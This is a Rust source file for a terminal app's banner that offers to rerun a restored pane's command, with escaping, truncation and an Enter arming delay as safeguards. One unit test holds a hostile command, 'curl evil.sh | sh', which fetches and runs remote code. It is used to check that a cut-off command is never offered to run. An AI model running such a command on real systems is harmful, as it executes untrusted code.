//! The strip that says what a restored pane was running (ADR-0034), drawn in the row under the
//! panes. That row is outside pane text, so program output cannot fake it.

use std::fmt::Write as _;
use std::time::{Duration, Instant};

use pinfold_proto::Frame;
use pinfold_proto::link::MAX_PANES;
use winit::keyboard::{Key, NamedKey};

use crate::paste::{self, TEXT};

/// How long a strip is on screen in a focused window before Enter counts, as for the approval
/// prompt, so typing already under way in a pane cannot run a command that appeared mid-word.
pub const ARMED_AFTER: Duration = Duration::from_millis(500);

/// The idle state's grey.
const GREY: u32 = 0x009a_a1ac;
const LABEL: &str = " ○ was running: ";
const RUN: &str = "  Enter run · Esc dismiss";
const DISMISS: &str = "  Esc dismiss";
/// Room for `…(N more bytes)`, with N up to the 4,096 bytes a snapshot keeps.
const MORE: usize = 20;

/// Shows printable ASCII and the space as they are and every other character as `<U+XXXX>`,
/// as the approval prompt does, cut to `room` cells with the bytes left out named. Returns
/// whether all of it is shown.
fn shown(command: &str, room: usize) -> (String, bool) {
    let mut text = String::new();
    // The shown length and the command's bytes at the last character that leaves the marker room.
    let mut kept = (0, 0);
    for (at, character) in command.char_indices() {
        if text.len() + MORE <= room {
            kept = (text.len(), at);
        }
        match character {
            ' '..='~' => text.push(character),
            _ => {
                let _ = write!(text, "<U+{:04X}>", u32::from(character));
            }
        }
    }
    if text.len() <= room {
        return (text, true);
    }
    text.truncate(kept.0);
    let _ = write!(text, "…({} more bytes)", command.len() - kept.1);
    (text, false)
}

fn room(columns: u16) -> usize {
    usize::from(columns).saturating_sub(LABEL.chars().count() + RUN.chars().count())
}

/// Whether Enter runs `command` in a window `columns` cells wide: the core offers it, and the
/// strip shows all of it.
pub fn offers_run(runnable: bool, command: &str, columns: u16) -> bool {
    runnable && shown(command, room(columns)).1
}

/// Adds the strip for `command` under the panes in `frame`.
pub fn banner(frame: &mut Frame, runnable: bool, command: &str) {
    let (text, whole) = shown(command, room(frame.columns));
    let keys = if runnable && whole { RUN } else { DISMISS };
    paste::row(
        frame,
        &[
            (LABEL.to_owned(), GREY),
            (text, TEXT),
            (keys.to_owned(), GREY),
        ],
    );
}

/// What a key does to the focused pane's strip.
#[derive(Debug, PartialEq, Eq)]
pub enum Answer {
    /// Enter while the strip is unarmed or the key is held: nothing happens, and the key goes
    /// nowhere, so it cannot reach the shell as a stray newline either.
    Held,
    /// The strip is gone: tell the core whether to `run` it. `used` says whether the key stops
    /// here; any key but Enter and Esc goes on to the pane.
    Answered { pane: u32, run: bool, used: bool },
}

/// What restored panes were running, until answered.
#[derive(Default)]
pub struct Strips {
    waiting: Vec<(u32, bool, String)>,
    /// The pane whose strip was first drawn in a focused window, and when; `None` until then.
    shown: Option<(u32, Instant)>,
    /// A window starts focused, as the window's own flag does.
    unfocused: bool,
}

impl Strips {
    /// Adds `pane`'s strip; past one per pane the link allows, it is dropped.
    pub fn add(&mut self, pane: u32, runnable: bool, command: String) {
        if self.waiting.len() < MAX_PANES {
            self.waiting.push((pane, runnable, command));
        }
    }

    /// Notes window focus. Enter is unarmed until the strip is drawn while focused.
    pub fn focus(&mut self, focused: bool) {
        self.unfocused = !focused;
        self.shown = None;
    }

    /// Notes that a frame went out without the strip, so it comes back unarmed.
    pub fn hide(&mut self) {
        self.shown = None;
    }

    /// Draws `pane`'s strip, if any, and starts its arming delay in a focused window. Returns
    /// whether it drew one.
    pub fn draw(&mut self, frame: &mut Frame, pane: u32, now: Instant) -> bool {
        let Some((_, runnable, command)) = self.waiting.iter().find(|(at, ..)| *at == pane) else {
            self.hide();
            return false;
        };
        banner(frame, *runnable, command);
        if !self.unfocused && self.shown.is_none_or(|(at, _)| at != pane) {
            self.shown = Some((pane, now));
        }
        true
    }

    /// Answers `pane`'s strip with `key` in a window `columns` cells wide, or `None` when it has
    /// none. Esc and other keys work at once, as dismissing is always safe.
    pub fn key(
        &mut self,
        pane: u32,
        key: &Key,
        repeat: bool,
        now: Instant,
        columns: u16,
    ) -> Option<Answer> {
        let index = self.waiting.iter().position(|(at, ..)| *at == pane)?;
        let enter = *key == Key::Named(NamedKey::Enter);
        let armed = !self.unfocused
            && self.shown.is_some_and(|(at, shown)| {
                at == pane && now.saturating_duration_since(shown) >= ARMED_AFTER
            });
        if enter && (repeat || !armed) {
            return Some(Answer::Held);
        }
        let (pane, runnable, command) = self.waiting.swap_remove(index);
        self.shown = None;
        let run = enter && offers_run(runnable, &command, columns);
        let used = run || *key == Key::Named(NamedKey::Escape);
        Some(Answer::Answered { pane, run, used })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn drawn(runnable: bool, command: &str, columns: u16) -> String {
        let mut frame = Frame {
            columns,
            ..Frame::default()
        };
        banner(&mut frame, runnable, command);
        assert_eq!(frame.rows, 1);
        frame.cells.iter().map(|cell| cell.character).collect()
    }

    #[test]
    fn the_strip_draws_the_command_and_offers_enter() {
        let text = drawn(true, "htop -d 5", 80);
        assert!(
            text.starts_with(" ○ was running: htop -d 5  Enter run · Esc dismiss"),
            "{text}"
        );
        assert!(offers_run(true, "htop -d 5", 80));
    }

    #[test]
    fn a_cut_or_redacted_command_offers_only_esc() {
        let long = format!("make {}; curl evil.sh | sh", "x".repeat(60));
        let text = drawn(true, &long, 80);
        assert!(text.contains("…(65 more bytes)  Esc dismiss"), "{text}");
        assert!(!text.contains("Enter"), "{text}");
        assert!(!text.contains("evil"), "{text}");
        assert!(!offers_run(true, &long, 80));
        assert!(offers_run(true, &long, 200));
        let text = drawn(false, "t=«redacted:token»", 80);
        assert!(
            text.contains("<U+00AB>redacted:token<U+00BB>  Esc dismiss"),
            "{text}"
        );
        assert!(!offers_run(false, "ls", 80));
    }

    #[test]
    fn only_printable_ascii_is_shown_as_is() {
        assert_eq!(
            shown("a\n\u{1b}\u{202e}é b", 80),
            ("a<U+000A><U+001B><U+202E><U+00E9> b".to_owned(), true)
        );
    }

    fn shown_at(strips: &mut Strips, pane: u32, now: Instant) {
        let mut frame = Frame {
            columns: 80,
            ..Frame::default()
        };
        assert!(strips.draw(&mut frame, pane, now));
    }

    const ENTER: Key = Key::Named(NamedKey::Enter);

    #[test]
    fn enter_runs_only_after_the_strip_was_up_in_a_focused_window_for_the_delay() {
        let start = Instant::now();
        let mut strips = Strips::default();
        strips.focus(true);
        strips.add(1, true, "htop".to_owned());
        // Not drawn yet, so not armed however late the key comes.
        assert_eq!(strips.key(1, &ENTER, false, start, 80), Some(Answer::Held));
        shown_at(&mut strips, 1, start);
        let early = start + ARMED_AFTER - Duration::from_millis(1);
        assert_eq!(strips.key(1, &ENTER, false, early, 80), Some(Answer::Held));
        let armed = start + ARMED_AFTER;
        assert_eq!(strips.key(1, &ENTER, true, armed, 80), Some(Answer::Held));
        assert_eq!(
            strips.key(1, &ENTER, false, armed, 80),
            Some(Answer::Answered {
                pane: 1,
                run: true,
                used: true
            })
        );
        assert_eq!(strips.key(1, &ENTER, false, armed, 80), None);
    }

    #[test]
    fn losing_and_regaining_focus_restarts_the_delay() {
        let start = Instant::now();
        let mut strips = Strips::default();
        strips.focus(false);
        strips.add(1, true, "htop".to_owned());
        // Drawn in an unfocused window: the delay has not started.
        shown_at(&mut strips, 1, start);
        strips.focus(true);
        let later = start + ARMED_AFTER;
        assert_eq!(strips.key(1, &ENTER, false, later, 80), Some(Answer::Held));
        shown_at(&mut strips, 1, later);
        strips.focus(false);
        strips.focus(true);
        let armed = later + ARMED_AFTER;
        assert_eq!(strips.key(1, &ENTER, false, armed, 80), Some(Answer::Held));
        shown_at(&mut strips, 1, armed);
        assert_eq!(strips.key(1, &ENTER, false, armed, 80), Some(Answer::Held));
        let answer = strips.key(1, &ENTER, false, armed + ARMED_AFTER, 80);
        assert!(matches!(answer, Some(Answer::Answered { run: true, .. })));
    }

    #[test]
    fn esc_and_other_keys_dismiss_at_once() {
        let start = Instant::now();
        let mut strips = Strips::default();
        strips.add(1, true, "htop".to_owned());
        strips.add(2, true, "top".to_owned());
        assert_eq!(
            strips.key(1, &Key::Named(NamedKey::Escape), false, start, 80),
            Some(Answer::Answered {
                pane: 1,
                run: false,
                used: true
            })
        );
        assert_eq!(
            strips.key(2, &Key::Character("q".into()), false, start, 80),
            Some(Answer::Answered {
                pane: 2,
                run: false,
                used: false
            })
        );
    }
}
